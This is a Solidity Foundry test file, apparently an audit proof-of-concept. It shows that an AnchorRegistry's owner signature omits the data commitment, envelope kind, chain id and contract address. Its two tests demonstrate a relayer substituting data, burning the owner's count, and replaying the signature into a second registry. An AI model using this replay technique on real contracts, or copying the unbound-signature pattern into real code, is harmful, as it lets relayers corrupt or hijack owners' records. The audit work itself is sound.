// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test} from "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

import {AnchorRegistry} from "src/registry/AnchorRegistry.sol";
import {IAnchorRegistry} from "interfaces/registry/IAnchorRegistry.sol";
import {IAttestationAccumulator} from "interfaces/merkle/IAttestationAccumulator.sol";
import {MerkleSnapshot} from "src/merkle/MerkleSnapshot.sol";
import {MockAccumulator} from "../../mocks/MockAccumulator.sol";
import {MockZkVerifier} from "../../mocks/MockZkVerifier.sol";

/// @notice PASS A PoC.
///
/// `AnchorRegistry.anchor` authenticates an address-kind head with
///
///     payload = keccak256(abi.encode(HEAD_DOMAIN_TAG, head, count))
///
/// The signature therefore covers NEITHER `envelopeKind` NOR `dataCommitment` — both of which are
/// folded into the leaf the guest consumes — and it is bound to no registry address and no chain
/// id. Two consequences, both reachable by a single governance-admitted relayer:
///
///   1. The relayer chooses the `dataCommitment` (the availability commitment the guest resolves
///      the head's contents through) and the `envelopeKind` for an owner-signed head.
///   2. `lastCount[nodeId]` is bumped to the relayed `count`, and `count <= previousCount` is then
///      rejected forever, so the owner's genuine anchor at that count can never be recorded. The
///      relayer permanently burns that position in the node's log.
///
/// The sibling `EasOffchainAnchorRegistry` gets this right (full EIP-712 struct over
/// `nodeId, envelopeKind, schemaUid, previousHead, head, count, dataCommitment` under a
/// `verifyingContract`-bound domain). The two near-twins disagree.
contract OmegaPassA_AnchorHeadSignature is Test {
    AnchorRegistry internal registryA;
    AnchorRegistry internal registryB;
    MerkleSnapshot internal snapshotA;
    MerkleSnapshot internal snapshotB;
    MockAccumulator internal accA;
    MockAccumulator internal accB;
    MockZkVerifier internal verifier;

    uint256 internal ownerKey = 0xA11CE;
    address internal owner;
    address internal relayer = makeAddr("relayer");
    address internal admin = address(this);

    function setUp() public {
        owner = vm.addr(ownerKey);
        verifier = new MockZkVerifier();

        accA = new MockAccumulator();
        registryA = new AnchorRegistry(admin, 200_000);
        snapshotA = new MerkleSnapshot(verifier, keccak256("p"), accA, address(this), address(this));
        snapshotA.setAnchorRegistry(IAnchorRegistry(address(registryA)));
        registryA.bindSnapshot(address(snapshotA));

        accB = new MockAccumulator();
        registryB = new AnchorRegistry(admin, 200_000);
        snapshotB = new MerkleSnapshot(verifier, keccak256("p"), accB, address(this), address(this));
        snapshotB.setAnchorRegistry(IAnchorRegistry(address(registryB)));
        registryB.bindSnapshot(address(snapshotB));

        registryA.grantRole(registryA.ANCHORER_ROLE(), relayer);
        registryB.grantRole(registryB.ANCHORER_ROLE(), relayer);
    }

    function _sign(bytes32 head, uint64 count) internal view returns (bytes memory) {
        bytes32 payload = keccak256(abi.encode(registryA.HEAD_DOMAIN_TAG(), head, count));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerKey, MessageHashUtils.toEthSignedMessageHash(payload));
        return abi.encodePacked(r, s, v);
    }

    function test_PassA_RelayerChoosesDataCommitmentAndBurnsTheCount() public {
        bytes32 nodeId = keccak256(abi.encode(owner));
        vm.prank(owner);
        registryA.register();

        bytes32 head = keccak256("owner-signed head #5");
        bytes memory sig = _sign(head, 5);

        // The owner signed (head, 5). The relayer supplies a dataCommitment and envelopeKind of
        // its own choosing; nothing in the signature covers them.
        vm.prank(relayer);
        registryA.anchor(nodeId, 99, head, 5, keccak256("relayer-chosen garbage"), sig);
        assertEq(registryA.lastCount(nodeId), 5);

        // The owner's real anchor for the same head at the same count is now permanently refused,
        // and so is anything below it.
        vm.prank(relayer);
        vm.expectRevert(abi.encodeWithSelector(AnchorRegistry.StaleHeadCount.selector, nodeId, uint64(5), uint64(5)));
        registryA.anchor(nodeId, 0, head, 5, keccak256("the real data commitment"), sig);
    }

    function test_PassA_HeadSignatureReplaysIntoAnUnrelatedInstanceRegistry() public {
        bytes32 nodeId = keccak256(abi.encode(owner));
        vm.prank(owner);
        registryA.register();
        vm.prank(owner);
        registryB.register();

        bytes32 head = keccak256("owner-signed head #7");
        bytes memory sig = _sign(head, 7);

        vm.prank(relayer);
        registryA.anchor(nodeId, 0, head, 7, keccak256("dc-a"), sig);

        // The SAME signature is accepted by a different instance's registry: the payload carries
        // no verifyingContract and no chainId.
        vm.prank(relayer);
        registryB.anchor(nodeId, 0, head, 7, keccak256("dc-b"), sig);
        assertEq(registryB.anchorCount(), 1, "cross-instance replay accepted");
    }
}
